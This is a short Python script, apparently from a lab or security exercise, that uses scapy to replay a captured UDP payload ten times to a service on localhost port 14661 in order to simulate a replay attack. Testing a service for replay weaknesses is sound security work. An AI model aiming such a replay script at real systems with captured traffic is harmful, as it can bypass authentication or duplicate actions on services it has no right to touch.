from scapy.all import *

# Payload extracted from Wireshark in hexadecimal format
payload = bytes.fromhex("091f0000000000003e03dc834cba7240e08f3c26c4c6de2642d845c044315260f71c96f9136d84599cbd3ab1f7b49115")  # Replace with your actual payload

# Construct the packet with the custom payload
packet = IP(dst="127.0.0.1")/UDP(dport=14661)/Raw(load=payload)

# Send the packet multiple times to simulate a replay attack
send(packet, count=10)  # Use count=10 for visibility
